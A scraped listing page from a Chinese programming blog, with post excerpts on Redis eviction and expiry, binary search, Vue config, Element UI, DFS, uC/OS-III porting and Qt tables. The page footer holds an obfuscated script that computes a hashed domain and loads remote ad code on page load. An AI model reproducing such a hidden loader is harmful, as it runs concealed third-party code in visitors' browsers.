allkeys-random：当内存不足以容纳新写入数据时，在键空间中，随机移除某个 key，这个一般没人用吧，为啥要随机，肯定是把最近最少使用的 key 给干掉啊。
volatile-lru：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的 key（这个一般不太合适）。
volatile-random：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个 key。
volatile-ttl：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的 key 优先移除。
RDB对过期key的处理 过期key对RDB没有任何影响，从内存数据库持久化数据到RDB文件：持久化key之前，会检查是否过期，过期的key不进入RDB文件 从RDB文件恢复数据到内存数据库：数据载入数据库之前，会对key先进行过期检查，如果过期，不导入数据库（主库情况）
AOF对过期key的处理 过期key对AOF没有任何影响 从内存数据库持久化数据到AOF文件：当key过期后，还没有被删除，此时进行执行持久化操作（该key是不会进入aof文件的，因为没有发生修改命令）当key过期后，在发生删除操作时，程序会向aof文件追加一条del命令（在将来的以aof文件恢复数据的时候该过期的键就会被删掉） AOF重写：重写时，会先判断key是否过期，已过期的key不会重写到aof文件
总结
以上就是今天要讲的内容，还希望各位读者大大能够在评论区积极参与讨论，给文章提出一些宝贵的意见或者建议📝，合理的内容，我会采纳更新博文，重新分享给大家。
🙏四连 关注🔎点赞👍收藏⭐️留言📝
感谢大家的支持，用心写博文分享给大家，你的支持（🔎点赞👍收藏⭐️留言📝）是对我创作的最大帮助。
🍊微信公众号：南北踏尘
🍊主页地址：java_wxid
🍊社区地址：幕后大佬
给读者大大的话
我本身是一个很普通的程序员，放在人堆里，除了与生俱来的🌹盛世美颜🌹、所剩不多的发量，就剩下180的大高个了。就是我这样的一个人，默默坚持写博文也有好多年了，有句老话说的好，🌕牛逼之前都是傻逼式的坚持🌕。希望自己可以通过大量的作品，时间的积累，个人魅力、运气和时机，可以打造属于自己的🌟技术影响力🌟。同时也希望自己可以成为一个🎄懂技术🎄，🎄懂业务🎄，🎄懂管理🎄的综合型人才，作为项目架构路线的总设计师，掌控全局的🌕团队大脑🌕，技术团队中的🍊绝对核心🍊是我未来几年不断前进的目标。
提示：以下都是资源分享，求个一键三连。 面试资料
福利大放送，🎉欢迎关注🔎点赞👍收藏⭐️留言📝，拜托了🙏，这对我真的很重要。
点击：面试资料
提取码：2021
200套PPT模板
福利大放送，🎉欢迎关注🔎点赞👍收藏⭐️留言📝，拜托了🙏，这对我真的很重要。
点击：200套PPT模板
提取码：2021
提问的智慧
福利大放送，🎉欢迎关注🔎点赞👍收藏⭐️留言📝，拜托了🙏，这对我真的很重要。
点击：提问的智慧
提取码：2021
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7cf028783d3046af5594d60452dc40f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ce3238e9961b38da6f4e4bb4b81d9bd/" rel="bookmark">
			二分查找的平均查找程度，秒看秒会
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.平均查找长度就是(ASL):表中每个元素查找成功的次数的总和/表中元素个数
由此发现规律:
表长为n
n = 7,ASL = 17
n = 8,ASL = 21
n = 9,ASL = 25
n = 10,ASL = 29
n = 11,ASL = 33
n = 12,ASL = 37
差值为4
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05dd5234470990f6d0ef56664114a4d8/" rel="bookmark">
			VUE-CLI 3.x的vue.config.js配置说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		module.exports = { baseUrl: "./", //1.默认为 "/":部署在一个域名的根路径上 ; 2. "./":所有的资源都会被链接为相对路径，这样打出来的包可以被部署在任意路径 outputDir: "dist", //默认为 "dist",指打包后的资源放置的路径，放在dist文件夹下 assetsDir: "static", //默认为:'' ,放置打包后生成的静态资源 (js、css、img、fonts) 的 (相对于 outputDir 的) 目录。 indexPath: "index.html", //Default: 'index.html' ,指定生成的 index.html 的输出路径 (相对于 outputDir) filenameHashing: true, //Default: true ,生成的静态资源在它们的文件名中包含了 hash 以便更好的控制缓存 // pages:undefined,//在 multi-page 模式下构建应用 lintOnSave: true, //Type: boolean|'error';Default: true; true:将 lint 错误输出为编译警告;'error':错误输出会导致编译失败 runtimeCompiler: false, //Default: false, 设置为 true 后你就可以在 Vue 组件中使用 template 选项了，但是这会让你的应用额外增加 10kb 左右 // transpileDependencies:[],//Default: [], 默认情况下 babel-loader 会忽略所有 node_modules 中的文件 productionSourceMap: false, //Default: true, 如果你不需要生产环境的 source map，可以将其设置为 false 以加速生产环境构建。 // crossorigin: undefined, //Default: undefined, 设置生成的 HTML 中 &lt;link rel="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05dd5234470990f6d0ef56664114a4d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9364bd3a45fe4dfae1899ff690b60ba/" rel="bookmark">
			vue的el-select同时获取label和value值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		template的代码:
&lt;el-form-item label="设备类型:" prop="equipmentTypeDictionaryId"&gt; &lt;el-select v-model="equipmentTypeInfo.equipmentTypeDictionaryId" filterable placeholder="试试搜索:访客机" @change="selectType"&gt; &lt;el-option v-for="item in deviceType" :key="item.equipmentTypeDictionaryId" :label="item.equipmentTypeName" :value="item.equipmentTypeDictionaryId" /&gt; &lt;/el-select&gt; &lt;/el-form-item&gt; script中method里代码:
// 选择设备类型 selectType (id) { let selectedItem = {} selectedItem = this.deviceType.find((item) =&gt; { // 这里的deviceType就是上面遍历的数据源 return item.equipmentTypeDictionaryId === id // 筛选出匹配数据，是对应数据的整个对象 }) this.equipmentTypeInfo.typeName = selectedItem.equipmentTypeName // 设备类型 }, 案例中是通过equippiypeDictionaryId 匹配找到其selectedItem,从而实现获取selectedItem.equipmentTypeName
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f16fde58bbac5b9d6da14739694f3c9c/" rel="bookmark">
			深度优先搜索(DFS)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.前言 深度优先搜索（缩写DFS）有点类似广度优先搜索，也是对一个连通图进行遍历的算法。它的思想是从一个顶点V0开始，沿着一条路一直走到底，如果发现不能到达目标解，那就返回到上一个节点，然后从另一条路开始走到底，这种尽量往深处走的概念即是深度优先的概念。
你可以跳过第二节先看第三节，:)
2.深度优先搜索VS广度优先搜索 2.1演示深度优先搜索的过程 还是引用上篇文章的样例图，起点仍然是V0，我们修改一下题目意思，只需要让你找出一条V0到V6的道路，而无需最短路。
图2-1 寻找V0到V6的一条路（无需最短路径）
假设按照以下的顺序来搜索：
1.V0-&gt;V1-&gt;V4，此时到底尽头，仍然到不了V6，于是原路返回到V1去搜索其他路径；
2.返回到V1后既搜索V2，于是搜索路径是V0-&gt;V1-&gt;V2-&gt;V6,，找到目标节点，返回有解。
这样搜索只是2步就到达了，但是如果用BFS的话就需要多几步。
2.2深度与广度的比较 （你可以跳过这一节先看第三节，重点在第三节）
我们假设一个节点衍生出来的相邻节点平均的个数是N个，那么当起点开始搜索的时候，队列有一个节点，当起点拿出来后，把它相邻的节点放进去，那么队列就有N个节点，当下一层的搜索中再加入元素到队列的时候，节点数达到了N2，你可以想想，一旦N是一个比较大的数的时候，这个树的层次又比较深，那这个队列就得需要很大的内存空间了。
于是广度优先搜索的缺点出来了：在树的层次较深&amp;子节点数较多的情况下，消耗内存十分严重。广度优先搜索适用于节点的子节点数量不多，并且树的层次不会太深的情况。
那么深度优先就可以克服这个缺点，因为每次搜的过程，每一层只需维护一个节点。但回过头想想，广度优先能够找到最短路径，那深度优先能否找到呢？深度优先的方法是一条路走到黑，那显然无法知道这条路是不是最短的，所以你还得继续走别的路去判断是否是最短路？
于是深度优先搜索的缺点也出来了：难以寻找最优解，仅仅只能寻找有解。其优点就是内存消耗小，克服了刚刚说的广度优先搜索的缺点。
3.深度优先搜索 3.1.举例 给出如图3-1所示的图，求图中的V0出发，是否存在一条路径长度为4的搜索路径。
图3-1
显然，我们知道是有这样一个解的：V0-&gt;V3-&gt;V5-&gt;V6。
3.2.处理过程 3.3.对应例子的伪代码 这里先给出上边处理过程的对应伪代码。
/** * DFS核心伪代码 * 前置条件是visit数组全部设置成false * @param n 当前开始搜索的节点 * @param d 当前到达的深度，也即是路径长度 * @return 是否有解 */ bool DFS(Node n, int d){ if (d == 4){//路径长度为返回true，表示此次搜索有解 return true; } for (Node nextNode in n){//遍历跟节点n相邻的节点nextNode， if (!visit[nextNode]){//未访问过的节点才能继续搜索 //例如搜索到V1了，那么V1要设置成已访问 visit[nextNode] = true; //接下来要从V1开始继续访问了，路径长度当然要加 if (DFS(nextNode, d+1)){//如果搜索出有解 //例如到了V6，找到解了，你必须一层一层递归的告诉上层已经找到解 return true; } //重新设置成未访问，因为它有可能出现在下一次搜索的别的路径中 visit[nextNode] = false; } //到这里，发现本次搜索还没找到解，那就要从当前节点的下一个节点开始搜索。 } return false;//本次搜索无解 } 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f16fde58bbac5b9d6da14739694f3c9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b152bfd55a4ee39752408b12e1b862b/" rel="bookmark">
			uc/OS-III系统移植
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、建立stm32 hal库工程
1.文件配置
2.结果
二uCOSIII的移植
1.准备源码
2.准备
3.开始
添加文件
4.参数配置
结果
三、波形分析
1.用示波器去观察LED输出电平和串口通信的波形
2.Keil虚拟仿真逻辑仪
四、参考文献
一、建立stm32 hal库工程 1.文件配置 配
设置PC13为GPIO_Output用于点亮LED灯 设置串口USART1
设置工程
点击生成代码，并在Keil中打开该工程。
在main函数中的while循环里添加语句
while (1) { /* USER CODE END WHILE */ /* USER CODE BEGIN 3 */ HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_SET); HAL_Delay(500); HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_RESET); HAL_Delay(500); } /* USER CODE END 3 */ 2.结果 二uCOSIII的移植 1.准备源码 进入官网下载：Micrium Software and Documentation - Silicon Labs
2.准备 将uCOS相关文件复制到HAL工程的MDK-ARM文件夹下
3.开始 添加文件 点击 ，然后添加
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b152bfd55a4ee39752408b12e1b862b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/665dc55a5520cee85100d9fb06cd584c/" rel="bookmark">
			Qt之QTableWidget的使用及常用设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		各种软件设计中，表格的使用非常频繁，下面介绍的是关于QTableWidget的使用以及常用属性的设置。
（1）创建一个新的表格控件
QTableWidget *table=new QTableWidget(); （2）设置列数
table-&gt;setColumnCount(3);//设置3列 注意：如果内容超过3列，则无法显示超过3列的内容，所以需要看情况重新设置列数
（3）设置行数
table-&gt;setRowCount(5);//设置5行 注意：如果内容超过5行，则无法显示超过3行的内容，所以需要看情况重新设置行数
（4）设置表头内容
QStringList header; //QString类型的List容器 header&lt;&lt;"学号"&lt;&lt;"姓名"&lt;&lt;"性别";//设置内容是学号、姓名、性别 table-&gt;setHorizontalHeaderLabels(header);//设置表头内容 （5）设置表格文字内容
QTableWidgetItem *name=new QTableWidgetItem();//创建一个Item name-&gt;setText("桃花庵");//设置内容 table-&gt;setItem(0,1,name);//把这个Item加到第一行第二列中 （6）可设置表格单元显示QComBox、QSpinBox、QLable、QDateTimeEdit等
QDateTimeEdit *dateTimeEdit= new QDateTimeEdit(); //创建一个QDateTimeEdit dateTimeEdit-&gt;setDateTime(QDateTime::currentDateTime());//设置为当前时间 dateTimeEdit-&gt;setDisplayFormat("dd/M/yyyy");//设置显示格式 dateTimeEdit-&gt;setCalendarPopup(true);//设置可以打开日历 table-&gt;setCellWidget (1,2,dateTimeEdit);//加到第二行第三列中 （7）设置表头的字体属性
QFont font ;//定义一个字体变量 font.setBold(true); //设置粗体 table-&gt;horizontalHeader()-&gt;setFont(font);//把字体变量属性加进表头中 （8）设置表头的内容充满整个表格的宽度
table-&gt;horizontalHeader()-&gt;setStretchLastSection(true); //设置表头充满表格的宽度 （9）设置表头的高度
table-&gt;horizontalHeader()-&gt;setFixedHeight(25); //设置表头的高度为25 （10）设置表头的列宽
table-&gt;horizontalHeader()-&gt;resizeSection(0,180); //设置表头第1列的宽度为180 （11）设置表格的行高
table-&gt;verticalHeader()-&gt;setDefaultSectionSize(10); //设置行高为10 QTableView或者QTableWidget的verticalHeader()-&gt;setDefaultSectionSize(15)可以设置tableview所有列的默认行高为15。
QTableView或者QTableWidget的horizontalHeader()-&gt;setDefaultSectionSize(15)可以设置tableview所有行的默认列宽为15。
（12）消除表格控件的边框
table-&gt;setFrameShape(QFrame::NoFrame); //设置无边框 （13）设置表格不显示格子线
table-&gt;setShowGrid(false); //设置不显示格子线 （14）去除每一行的左边序号
table-&gt;verticalHeader()-&gt;setVisible(false); //设置垂直头不可见,即左边序号不见 （15）设置选择行为时每次一行
table-&gt;setSelectionBehavior(QAbstractItemView::SelectRows); //设置选择行为时每次一行 （16）设置对行可进行多选
table-&gt;setSelectionMode(QAbstractItemView::ExtendedSelection); //可多选（Ctrl、Shift、Ctrl+A都可以） （17）设置表格内容不能编辑
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/665dc55a5520cee85100d9fb06cd584c/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/312/">«</a>
	<span class="pagination__item pagination__item--current">313/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/314/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>